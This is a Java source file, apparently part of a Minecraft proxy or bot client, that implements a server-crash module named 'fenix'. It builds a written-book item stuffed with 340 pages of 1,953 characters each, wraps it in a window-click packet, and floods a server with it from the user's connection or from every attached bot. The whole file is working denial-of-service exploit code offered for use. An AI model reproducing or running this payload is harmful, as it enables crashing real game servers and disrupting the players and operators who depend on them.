package pl.venixpll.system.crash.impl;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import pl.venixpll.mc.data.game.WindowAction;
import pl.venixpll.mc.data.item.ItemStack;
import pl.venixpll.mc.objects.Player;
import pl.venixpll.mc.packet.Packet;
import pl.venixpll.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import pl.venixpll.system.crash.Crash;
import pl.venixpll.system.crash.CrashType;

import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashFenix extends Crash {
    public CrashFenix() {
        super("fenix",CrashType.NBT);
    }

    private Packet packet;

    @Override
    public void init() {

        final AtomicReference<String> pageContent = new AtomicReference<>();
        pageContent.set("");

        IntStream.range(0,1953).forEach(i -> pageContent.set(pageContent.get() + "."));

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 340)
                .mapToObj(ia -> new NBTTagString(pageContent.get()))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages",pages);
        compound.setTag("title",new NBTTagString("8kBolTfSMpV2yJ"));
        compound.setTag("author",new NBTTagString("Tadeq05177"));

        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
        this.packet = new ClientPlayerWindowActionPacket(0,(short)20,0, WindowAction.CLICK_ITEM,0,itemStack);
    }

    @Override
    public void execute(String message, Player sender) {

        if(packet == null){
            sender.sendChatMessage("&cFailed to initialize crash!");
            return;
        }

        try {
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                IntStream.range(0,amount).forEach(i -> sender.getConnector().sendPacket(packet));
                sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
            } else {
                sender.getBots().forEach(b -> IntStream.range(0,amount).forEach(i -> b.getConnection().sendPacket(packet)));
                sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
            }
        }catch(final Throwable t){
            sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
